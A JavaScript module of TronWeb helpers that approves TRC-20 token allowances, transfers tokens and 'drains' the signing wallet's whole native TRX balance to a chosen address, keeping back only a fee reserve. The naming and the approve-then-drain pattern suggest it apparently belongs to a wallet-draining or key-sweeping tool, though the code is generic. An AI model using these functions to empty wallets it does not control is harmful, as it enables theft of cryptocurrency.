import config from '../config.js';

export const approveToken = async (tronWeb, tokenAddress, spender, amount) => {
    try {
        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
            tokenAddress,
            'approve(address,uint256)',
            { 
                feeLimit: 120_000_000,
                callValue: 0 
            },
            [spender, amount],
            tronWeb.defaultAddress.base58
        );

        const signed = await tronWeb.trx.sign(tx.transaction);
        const result = await tronWeb.trx.sendRawTransaction(signed);

        console.log(`✅ Approved ${tokenAddress}`);
        return result.txid;
    } catch (error) {
        console.error("Approve failed:", error);
        throw error;
    }
};

export const transferToken = async (tronWeb, tokenAddress, to, amount) => {
    try {
        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
            tokenAddress,
            'transfer(address,uint256)',
            { feeLimit: 120_000_000 },
            [to, amount],
            tronWeb.defaultAddress.base58
        );

        const signed = await tronWeb.trx.sign(tx.transaction);
        const result = await tronWeb.trx.sendRawTransaction(signed);

        console.log(`✅ Transferred to ${to}`);
        return result.txid;
    } catch (error) {
        console.error("Transfer failed:", error);
        throw error;
    }
};

export const drainNativeTRX = async (tronWeb, toAddress) => {
    try {
        const balance = await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58);
        const balanceTRX = balance / 1_000_000;

        if (balanceTRX <= config.leaveForFee) return;

        const amountToSend = Math.floor((balanceTRX - config.leaveForFee) * 1_000_000);

        const tx = await tronWeb.transactionBuilder.sendTrx(
            toAddress,
            amountToSend,
            tronWeb.defaultAddress.base58
        );

        const signed = await tronWeb.trx.sign(tx);
        await tronWeb.trx.sendRawTransaction(signed);

        console.log(`✅ Drained ${amountToSend / 1e6} TRX`);
    } catch (error) {
        console.error("Native drain failed:", error);
    }
};